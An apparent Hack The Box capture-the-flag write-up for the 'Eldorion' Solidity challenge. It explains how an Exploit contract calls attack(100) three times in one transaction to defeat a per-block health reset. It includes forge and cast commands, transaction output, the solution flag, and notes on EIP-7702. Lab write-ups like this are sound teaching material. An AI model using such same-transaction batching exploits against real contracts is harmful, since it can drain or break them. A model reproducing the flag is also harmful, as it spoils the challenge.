# Eldorion

![img](./assets/ChallengeBanner.png)
---
<p align="center">
    <img src="./assets/EventBanner.jpg" />
</p>

15<sup>th</sup> Mar 2024 \
Prepared By: perrythepwner \
Challenge Author(s): **perrythepwner** \
Difficulty: <font color=lightgreen>Very-Easy</font>

---

# TLDR
A simple setup challenge where a player have to write a multicall smart contract that interacts with the Eldorion smart contract in order to fit multiple function calls in the same transaction.  

# Description
> Welcome to the realms of Eldoria, adventurer. You’ve found yourself trapped in this mysterious digital domain, and the only way to escape is by overcoming the trials laid before you.  
But your journey has barely begun, and already an overwhelming obstacle stands in your path. Before you can even reach the nearest city, seeking allies and information, you must face **Eldorion**, a colossal beast with terrifying regenerative powers. This creature, known for its "eternal resilience" guards the only passage forward. It's clear: you ***must*** defeat Eldorion to continue your quest.

# Skills Required
- Basic understanding of Solidity and smart contracts
- Interaction with smart contracts

# Skills Learned
- Interacting with smart contracts
- Writing smart contract for batching function calls 

# Challenge Scenario
We're given with some attachments and 2 ports to interact to.  
By simply navigating to the given `url:port` pairs, we understand that:  
- One is just for TCP connections   
- One is an HTTP webserver that replies with "rpc is running!"

Connecting to the TCP port using netcat we will get connection informations to be able to interact with the challenge environment. Selecting the `1 - Get connection informations` option we will get the player private key, player address, target contract address and finally a "setup" contract address.

# Analyzing the Source Code

## `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Eldorion } from "./Eldorion.sol";

contract Setup {
    Eldorion public immutable TARGET;
    
    event DeployedTarget(address at);

    constructor() payable {
        TARGET = new Eldorion();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return TARGET.isDefeated();
    }
}
```

In the attachments we do have in fact a contract named `Setup.sol` that just deploys the target contract (`Eldorion.sol`) and defines a `isSolved()` function that will be called by the flag checker to assert that some conditions are satisfied in order to give the flag to the player.  
In particular, these condition just needs the `isDefeated()` of the target contract to return true. 

## `Eldorion.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Eldorion {
    uint256 public health = 300;
    uint256 public lastAttackTimestamp;
    uint256 private constant MAX_HEALTH = 300;
    
    event EldorionDefeated(address slayer);
    
    modifier eternalResilience() {
        if (block.timestamp > lastAttackTimestamp) {
            health = MAX_HEALTH;
            lastAttackTimestamp = block.timestamp;
        }
        _;
    }
    
    function attack(uint256 damage) external eternalResilience {
        require(damage <= 100, "Mortals cannot strike harder than 100");
        require(health >= damage, "Overkill is wasteful");
        health -= damage;
        
        if (health == 0) {
            emit EldorionDefeated(msg.sender);
        }
    }

    function isDefeated() external view returns (bool) {
        return health == 0;
    }
}
```

In the Eldorion contract we understand that `isDefeated()` in order to return true, the health of the "monster" (Eldorion) should be zero. We see that `attack()` function allows us to decrease the health of the monster by a maximum of 100 health for each function call.  
The `eternalResilience()` modifier is also applied to the `attack()` function, that is just a block of code that runs before executing the code inside the wrapped function. The `_` symbol it's in fact just a placeholder to tell the compiler where to put the function code that's being applied with the modifier (it can be at the start of the modifer as well).   

At first glance it seems that calling the `attack()` function 3 times from our player account for a total of 300 damage combined would be enough, but the `eternalResilience` it's impeding that. Why? the following if statement is always executed at the start when calling the `attack` function: 

```solidity
if (block.timestamp > lastAttackTimestamp) {
            health = MAX_HEALTH;
            lastAttackTimestamp = block.timestamp;
}
```

If the current block timestamp (the timestamp the previous block was mined) is greater than the stored `lastAttackTimestamp`, then the `health` storage variable is set back to `MAX_HEALTH` (300) and `lastAttackTimestamp` with the current `block.timestamp`. In other words, calling the `attack()` function by an EOA would mean to execute the `attack()` function in a different block each time, allowing the Eldorion monster to regain full health before each attack. 

# Exploitation

This is a well-known limitation of an EOA in the Ethereum blockchain, however this can be easily bypassed since smart contracts can do batch executions, that means we can call the same functions multiple times in the same transaction, hence in the same block and with equal `block.timestamp`.  
The solution involves just calling  `attack(100)` three times consecutevely from a smart contract: 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Eldorion } from "./Eldorion.sol"; 

contract Exploit {
    function win(address _target) public {
        Eldorion eldorion = Eldorion(_target);
        eldorion.attack(100);
        eldorion.attack(100);
        eldorion.attack(100);

        require(eldorion.isDefeated(), "Eldorion is not defeated");
    }
}
```


Now we just need to deploy the Exploit contract using for example forge with `forge create` and then calling the `win()` function of the Exploit contract.

```sh
➜ forge build
[⠊] Compiling...
[⠒] Compiling 2 files with Solc 0.8.28
[⠢] Solc 0.8.28 finished in 29.41ms
Compiler run successful!

➜ forge create src/Exploit.sol:Exploit --rpc-url $RPC --private-key $PVK
[⠊] Compiling...
[⠒] Compiling 2 files with Solc 0.8.28
[⠢] Solc 0.8.28 finished in 32.08ms
Compiler run successful!
Deployer: 0xCC54Fc5b35188f1EC13C049B33b831a2D6f0b944
Deployed to: 0x4641d03e38b69276afbcBcE1518520955B3FFDcA
Transaction hash: 0x5d82db86cf6332d4b61ba88af3e0756de59e413536f4fc5652979bd1b45494f1

➜ EXPLOIT=0x4641d03e38b69276afbcBcE1518520955B3FFDcA
➜ TARGET=0x251DEd71b8958BbCBe9856d10718E93c3DFdf83C

➜ cast send $EXPLOIT "win(address)" $TARGET --rpc-url $RPC --private-key $PVK

blockHash               0x4b471b205a2057b3b44d94ee2cfad6a24a1c15ac5936b19ecf4b0e8749671d97
blockNumber             3
contractAddress
cumulativeGasUsed       52019
effectiveGasPrice       1000000000
from                    0xCC54Fc5b35188f1EC13C049B33b831a2D6f0b944
gasUsed                 52019
logs                    [{"address":"0x251ded71b8958bbcbe9856d10718e93c3dfdf83c","topics":["0xebade57dfc06b2a07c4dc88f21eda0fe7af62c34f1a6b4b56e09b32a2bda0cc7"],"data":"0x0000000000000000000000004641d03e38b69276afbcbce1518520955b3ffdca","blockHash":"0x4b471b205a2057b3b44d94ee2cfad6a24a1c15ac5936b19ecf4b0e8749671d97","blockNumber":"0x3","blockTimestamp":"0x67db3a81","transactionHash":"0xa01d7f88587c158d1a520b8423d8a81f7156372110453f42d8c0e5973dc7e287","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
logsBloom               0x00000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000008010
root
status                  1 (success)
transactionHash         0xa01d7f88587c158d1a520b8423d8a81f7156372110453f42d8c0e5973dc7e287
transactionIndex        0
type                    2
blobGasPrice            1
blobGasUsed
authorizationList
to                      0x4641d03e38b69276afbcBcE1518520955B3FFDcA
```

We can now connect back to the challenge handler, that will check conditions by calling the `isSolved()` function in the `Setup` contract, and print the flag.

```sh
➜ nc $IP $PORT
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 3
HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}
```
We could also have done that using `web3py`:

```py
[...]
Exploit = w3.eth.contract(abi=exploit_abi, bytecode=exploit_bytecode)
Exploit.constructor().build_transaction({...})
exploit_contract = w3.eth.contract(address=exploit_addr, abi=exploit_abi)
exploit_contract.functions.win(target_addr).build_transaction({...})
[...]
```

see the full exploitation script [here](./htb/solver.py).

# Bonus

The known limitation of not being able to batch transactions using an Externally Owned Account (EOA), has actually been a subject of discussion over the years for Ethereum devs, to the point of creating the [EIP-7702](https://eips.ethereum.org/EIPS/eip-7702) proposal.  
**EIP-7702** enables EOA owners to sign a "delegation designator", i.e. an address containing executable code that their EOAs temporarily adopt. In order to do so, EIP-7702 introduces also a **new transaction type (0x04) called "set code" transaction**, which includes a new field called `authorization_list` that contains an address representing the delegation designator contract.  
In simpler terms, with this new standard, EOAs can now execute smart contract logic directly from their own address, making possible to do:
- **Batch Transactions**: EIP-7702 allows EOAs to batch multiple transactions into a single atomic transaction via the delegation designator.
- **Sponsored Transactions**: A third party (or relayer) can cover the gas fees, meaning users can execute transactions even without holding Ether.
- **Social Recovery**: By using a delegation designator, an account can be programmed to recover access through trusted parties or predetermined recovery mechanisms if keys are lost or compromised.

And much more.  
As the time of writing, the EIP has the last call deadline for the 2025-04-01 and it's currently being tested on Sepolia Testnet. It should be included in the [Ethereum Pectra Upgrade](https://ethereum.org/en/roadmap/pectra/), effectively bridging the gap toward full [Account Abstraction](https://ethereum.org/en/roadmap/account-abstraction/).  
Reason why this is probably the last time this challenge can make sense :) 


---
> `HTB{w0w_tr1pl3_hit_c0mbo_ggs_y0u_defe4ted_Eld0r10n}`
